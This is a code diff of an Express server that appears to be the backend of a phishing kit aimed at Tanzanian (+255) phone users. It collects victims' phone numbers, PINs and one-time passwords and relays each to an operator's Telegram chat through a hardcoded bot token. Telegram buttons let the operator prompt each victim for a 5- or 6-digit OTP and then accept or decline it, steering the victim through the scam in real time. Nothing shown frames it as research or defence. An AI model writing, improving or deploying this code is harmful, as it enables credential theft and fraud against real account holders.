@@ -26,78 +26,102 @@ app.use(bodyParser.json());
 // --- TELEGRAM CONFIG ---
 const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
 const TELEGRAM_ADMIN_ID = "7162306402";
-const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed
+const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 
+app.use(cors());
+app.use(bodyParser.json());
 
+// In-memory session store
 const sessions = {};
-// 1. Initial Login
-app.post('/api/submit', async (req, res) => {
-    const { phone, pin, sessionId } = req.body;
-    sessions[sessionId] = { phone, pin, status: 'waiting_choice' };
 
-    const message = `🚀 *New User Login*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}`;
+// 1. Initial Submission from index.html
+app.post('/api/submit', async (req, res) => {
+    const { phone, pin } = req.body;
+    const sessionId = uuidv4().substring(0, 8);
     
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: TELEGRAM_ADMIN_ID,
-        text: message,
-        parse_mode: "Markdown",
-        reply_markup: {
-            inline_keyboard: [[
-                { text: "Ask OTP (5)", callback_data: `ask_5_${sessionId}` },
-                { text: "Ask OTP (6)", callback_data: `ask_6_${sessionId}` }
-            ]]
-        }
-    });
-    res.json({ success: true });
+    sessions[sessionId] = { 
+        phone, 
+        pin, 
+        status: 'pending',
+        timestamp: Date.now() 
+    };
+
+    const message = `🔔 *New Login Attempt*\n\n📱 *Phone:* \`+255${phone}\`\n🔐 *PIN:* \`${pin}\`\n🆔 *ID:* \`${sessionId}\``;
+    
+    // Telegram buttons using URL-based commands for simple admin control
+    const reply_markup = {
+        inline_keyboard: [
+            [
+                { text: "🔢 OTP 5", url: `${BASE_URL}/api/command/${sessionId}/otp5` },
+                { text: "🔢 OTP 6", url: `${BASE_URL}/api/command/${sessionId}/otp6` }
+            ],
+            [
+                { text: "✅ Accept OTP", url: `${BASE_URL}/api/command/${sessionId}/accept` },
+                { text: "❌ Decline OTP", url: `${BASE_URL}/api/command/${sessionId}/decline` }
+            ]
+        ]
+    };
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_ADMIN_ID,
+            text: message,
+            parse_mode: "Markdown",
+            reply_markup: reply_markup
+        });
+        res.json({ success: true, sessionId });
+    } catch (error) {
+        console.error("Telegram Error:", error.message);
+        res.status(500).json({ success: false });
+    }
 });
 
-// 2. Poll Status
+// 2. Command Endpoint (Clicked from Telegram)
+app.get('/api/command/:sessionId/:cmd', (req, res) => {
+    const { sessionId, cmd } = req.params;
+    if (sessions[sessionId]) {
+        sessions[sessionId].status = cmd;
+        return res.send(`
+            <body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#f0f4f8;">
+                <div style="background:white; display:inline-block; padding:30px; border-radius:20px; shadow:0 4px 6px rgba(0,0,0,0.1);">
+                    <h2 style="color:#003366;">Action Success!</h2>
+                    <p>Command: <b>${cmd}</b> sent to user app.</p>
+                    <script>setTimeout(() => window.close(), 1500);</script>
+                </div>
+            </body>
+        `);
+    }
+    res.status(404).send("Session not found");
+});
+
+// 3. Status Polling (Checked by index.html and step6.html)
 app.get('/api/status/:sessionId', (req, res) => {
     const session = sessions[req.params.sessionId];
     res.json(session ? { status: session.status } : { status: 'idle' });
 });
 
-// 3. Submit OTP & Wait for Admin Decision
+// 4. Submit OTP (From step6.html)
 app.post('/api/submit-otp', async (req, res) => {
     const { otp, sessionId } = req.body;
     if (sessions[sessionId]) {
         sessions[sessionId].status = 'verifying';
-        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
+        const msg = `🔐 *OTP Received*\n\n📱 *User:* +255${sessions[sessionId].phone}\n🔢 *OTP:* \`${otp}\`\n🆔 *ID:* \`${sessionId}\``;
+        
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: TELEGRAM_ADMIN_ID,
             text: msg,
             parse_mode: "Markdown",
             reply_markup: {
                 inline_keyboard: [[
-                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
-                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
+                    { text: "✅ Accept", url: `${BASE_URL}/api/command/${sessionId}/accept` },
+                    { text: "❌ Decline", url: `${BASE_URL}/api/command/${sessionId}/decline` }
                 ]]
             }
         });
         res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
     }
 });
 
-// 4. Webhook for Admin Clicks
-app.post('/api/webhook', (req, res) => {
-    const { callback_query } = req.body;
-    if (!callback_query) return res.sendStatus(200);
-
-    const [action, val, sid] = callback_query.data.split('_');
-    if (sessions[sid]) {
-        if (action === 'ask') sessions[sid].status = `go_otp_${val}`;
-        else if (action === 'accept') sessions[sid].status = 'approved';
-        else if (action === 'decline') sessions[sid].status = 'declined';
-    }
-    res.sendStatus(200);
-});
-
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`
-🚀 SERVER STARTED SUCCESSFULLY
-----------------------------------
-Local access: http://localhost:${PORT}
-Network access: Check your IP (e.g., http://192.168.1.x:${PORT})
-----------------------------------
-    `);
-});
+app.listen(PORT, () => console.log(`Server live on ${BASE_URL}`));
